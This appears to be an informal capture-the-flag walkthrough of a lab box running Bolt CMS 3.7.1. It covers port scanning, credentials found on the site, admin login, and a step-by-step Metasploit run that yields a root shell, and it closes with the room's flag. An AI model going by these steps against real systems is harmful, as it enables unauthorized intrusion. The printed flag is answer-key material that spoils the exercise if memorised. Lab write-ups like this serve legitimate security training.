@@ -1,0 +1,117 @@
+here we get 3 port open 
+
+22 80 and 8000 now checking 80 and 8000 one by one 
+
+on port 80 only apache server is running 
+
+
+here we go 
+
+we get the web interface here now as usually check the web page and source carefully
+
+
+nothing special found in source page now lets check the web may be username is given or something else
+
+user ===>> Jake (Admin)  
+username ===>> bolt 
+we get the password ===>> boltadmin123
+
+
+
+
+there is an admin user who is jake but his username is bolt ..  got it .. 
+
+
+now using these credentials i can try to enter in the system using ssh 
+
+
+
+i am looking for the login page lets google it 
+
+
+http://yourdomain.com/bolt   we get the login page now let get enter in the website using credentials 
+
+
+boom !!!  You've been logged on successfully.    :)) 
+
+now i will check it for and upload or something like that okay say yes 
+
+
+
+
+
+    Admin logged in (2 minutes ago)
+    Admin logged in (3 years ago)
+    Admin logged out (3 years ago)
+    Updated user account 'Admin'. (3 years ago)
+    Admin logged in (3 years ago)
+    Admin logged out (3 years ago)
+    Added user account 'Admin'. (3 years ago)
+
+ every thing is 3 year previous so it is definetly vulnerable to something we just have to find that 
+ 
+ so Version: 3.7.1 this version is vulnerable i just checked it on google 
+ 
+ 
+ 48296  this is just an id of the exploit no need to remember 
+ 
+ 
+ one thing just clicked in my mind what if we get in using metasploit 
+ so lets check it 
+ 
+ 
+ 
+ msfconsole ===>>  
+ 
+ 
+ type step 1 == msfconsole 
+  step 2 == search bolt 
+  step 3 == use the one which is suitable in our case "use 0"
+ step 4 == check options using options 
+ 
+ step 5 == set lhost tunn0
+ 6== set rhosts {victim ip}
+ 7 == set username {jo username h }
+ 8 == set password [jo password h ]
+ 9  == type run or exploit 
+ 
+ 
+ 10 = boom !!! you are in 
+ 
+ 
+ 
+ Command shell session 1 opened  we get shell
+  we are in root user ===>> uid=0(root) gid=0(root) groups=0(root)
+  
+  
+  
+  now just do ls and check what are the files given and type pwd for checking oresent working directory and go to cd /home and type ls 
+  
+  and you see the flag.txt 
+  
+  
+  flag is ===>> THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
+
+
+
+ 
+ work done   
+ 
+ 
+ hope you understand well 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
